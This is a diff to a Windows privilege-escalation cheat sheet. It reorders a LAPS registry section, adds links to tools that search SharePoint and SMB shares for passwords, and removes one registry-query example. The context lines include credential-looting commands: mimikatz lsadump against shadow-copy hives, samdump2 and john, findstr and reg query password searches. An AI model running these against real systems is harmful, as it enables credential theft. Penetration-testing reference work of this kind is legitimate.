@@ -14,8 +14,8 @@
     * [Default Writeable Folders](#default-writeable-folders)
 * [EoP - Looting for passwords](#eop---looting-for-passwords)
     * [SAM and SYSTEM files](#sam-and-system-files)
-    * [LAPS Settings](#laps-settings)
     * [HiveNightmare](#hivenightmare)
+    * [LAPS Settings](#laps-settings)
     * [Search for file contents](#search-for-file-contents)
     * [Search for a file with a certain filename](#search-for-a-file-with-a-certain-filename)
     * [Search the registry for key names and passwords](#search-the-registry-for-key-names-and-passwords)
@@ -405,15 +405,6 @@ samdump2 SYSTEM SAM -o sam.txt
 
 Either crack it with `john -format=NT /root/sam.txt`, [hashcat](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Hash%20Cracking.md#hashcat) or use Pass-The-Hash.
 
-### LAPS Settings
-
-Extract `HKLM\Software\Policies\Microsoft Services\AdmPwd` from Windows Registry.
-
-* LAPS Enabled: AdmPwdEnabled
-* LAPS Admin Account Name: AdminAccountName
-* LAPS Password Complexity: PasswordComplexity
-* LAPS Password Length: PasswordLength
-* LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled
 
 ### HiveNightmare
 
@@ -443,6 +434,16 @@ mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\W
 mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
 ```
 
+### LAPS Settings
+
+Extract `HKLM\Software\Policies\Microsoft Services\AdmPwd` from Windows Registry.
+
+* LAPS Enabled: AdmPwdEnabled
+* LAPS Admin Account Name: AdminAccountName
+* LAPS Password Complexity: PasswordComplexity
+* LAPS Password Length: PasswordLength
+* LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled
+
 
 ### Search for file contents
 
@@ -451,6 +452,10 @@ cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
 findstr /si password *.xml *.ini *.txt *.config
 findstr /spin "password" *.*
 ```
+
+Also search in remote places such as SMB Shares and SharePoint.
+* Search passwords in SharePoint: [nheiniger/SnaffPoint](https://github.com/nheiniger/SnaffPoint)
+* Search passwords in SMB Shares: [SnaffCon/Snaffler](https://github.com/SnaffCon/Snaffler)
 
 ### Search for a file with a certain filename
 
@@ -475,12 +480,6 @@ reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
 
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
-```
-
-### Read a value of a certain sub key
-
-```powershell
-REG QUERY "HKLM\Software\Microsoft\FTH" /V RuleList
 ```
 
 ### Passwords in unattend.xml
